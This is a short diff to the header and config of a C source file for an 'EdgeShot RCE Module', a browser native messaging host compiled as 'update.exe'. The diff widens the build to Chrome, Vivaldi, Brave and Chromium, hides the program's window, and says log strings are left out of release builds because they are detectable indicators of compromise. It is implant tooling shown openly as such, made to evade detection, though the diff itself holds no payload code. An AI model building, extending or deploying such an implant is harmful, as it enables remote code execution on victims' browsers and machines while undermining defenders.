@@ -1,6 +1,10 @@
 /*
  * Native Messaging Host — EdgeShot RCE Module
- * Compile: x86_64-w64-mingw32-gcc -O2 -s -o update.exe native-host.c -DBROWSER=edge
+ * Compile (Windows, MinGW): pick ONE browser flag — -DCHROME / -DVIVALDI /
+ *   -DBRAVE / -DCHROMIUM (omit all of them for Edge). Example:
+ *     x86_64-w64-mingw32-gcc -O2 -s -static -mwindows -DVIVALDI -o update.exe native-host.c
+ *   Do NOT use -DBROWSER=<name>: that string macro is never tested by the #if
+ *   chain below, so it silently compiles an Edge host on every browser.
  *   Add -DDEBUG_LOG to re-enable the %TEMP%\update_host.log trace (off by default:
  *   the log format strings are heavy static IOCs, so the release build omits them).
  *
@@ -17,9 +21,10 @@
 #include <time.h>
 
 /* ── Config ─────────────────────────────────────────────────────── */
-#ifndef BROWSER
-#define BROWSER "edge"
-#endif
+/* Browser selection: define ONE of CHROME / BRAVE / VIVALDI / CHROMIUM (or the
+ * long forms BROWSER_chrome / BROWSER_brave / BROWSER_vivaldi / BROWSER_chromium).
+ * Omit all of them to target Edge (the #else fallback below). The registry key
+ * and extensions path are chosen in the #if chain that follows. */
 
 #define HOST_NAME     "com.site.agent"
 
